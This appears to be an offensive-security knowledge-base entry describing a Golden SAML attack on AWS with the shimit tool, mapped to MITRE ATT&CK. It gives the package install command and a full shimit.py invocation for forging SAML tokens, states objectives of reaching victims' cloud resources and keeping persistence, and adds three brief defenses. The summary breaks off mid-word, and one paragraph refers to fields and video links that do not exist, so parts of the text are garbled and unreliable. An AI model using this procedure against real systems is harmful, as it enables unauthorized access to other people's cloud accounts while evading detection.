---
id: f109bc51-828b-42d1-9193-3e8d1f15bf54
name: Golden SAML Attack with Shimit Installation and Configuration
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:09.729566+00:00'
updated_at: '2023-04-10T20:20:18.041590+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Unsecured Credentials|T1552 - Unsecured Credentials]]'
sub_techniques:
- '[[Private Keys|T1552.004 - Private Keys]]'
tags:
- '[[AWS - Golden SAML Attack]]'
- '[[Cloud - AWS]]'
commands:
- '[[Install Python packages boto3, botocore, defusedxml, enum, python_dateutil, lxml,
  signxml]]'
- '[[Run shimit.py script with required parameters]]'
---

# Golden SAML Attack with Shimit Installation and Configuration

## Summary

The Golden SAML attack is a technique that allows an attacker to create a forged SAML token, which can then be used to gain access to a victim's cloud resources. Shimit is a tool that can be used to automate the process of creating a Golden SAML token. The attacker first needs to gain access to a v

## Description

# Description

The Golden SAML attack is a technique that allows an attacker to create a forged SAML token, which can then be used to gain access to a victim's cloud resources. Shimit is a tool that can be used to automate the process of creating a Golden SAML token. The attacker first needs to gain access to a victim's AWS environment and extract the necessary information to create the forged SAML token. Once the token has been created, the attacker can use it to access the victim's cloud resources without needing to know their credentials. This attack can be difficult to detect, as it appears as a legitimate user accessing the cloud resources.

This attack is useful for gaining access to sensitive cloud resources or for maintaining persistence within a victim's environment.

## Requirements

1. Access to a victim's AWS environment

1. Knowledge of the necessary information to create a forged SAML token

1. Installation and configuration of Shimit

## Defense

1. Implement multi-factor authentication to prevent unauthorized access to AWS environments

1. Monitor AWS logs for suspicious activity, such as the creation of new roles or the modification of existing roles

1. Regularly review and revoke unnecessary permissions for AWS roles and users

## Objectives

1. Gain access to a victim's cloud resources

1. Maintain persistence within a victim's environment

# Instructions

1. To install Shimit, run the following command:

$ python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml

To configure Shimit, run the following command:

$ python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file
-u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012

Replace the values for the parameters with the appropriate values for your environment.

**Code**: [[$ python -m pip install boto3 botocore defusedxml ]]

> This command installs and configures Shimit, a tool used for performing Golden SAML attacks. The 'data' field provides the command to install and configure Shimit. The 'text' field provides links to a YouTube video and a blog post that provide more information about Golden SAML attacks. The 'instruction' field provides step-by-step instructions on how to install and configure Shimit. The 'explain' field provides a brief explanation of what the command does.

**Command** ([[Install Python packages boto3, botocore, defusedxml, enum, python_dateutil, lxml, signxml]]):

```bash
$ python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml
```

**Command** ([[Run shimit.py script with required parameters]]):

```bash
$ python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Unsecured Credentials|T1552 - Unsecured Credentials]]

### Sub-Techniques

- [[Private Keys|T1552.004 - Private Keys]]

## Commands Used

- [[Install Python packages boto3, botocore, defusedxml, enum, python_dateutil, lxml, signxml]]
- [[Run shimit.py script with required parameters]]

## Tags

- [[AWS - Golden SAML Attack]]
- [[Cloud - AWS]]
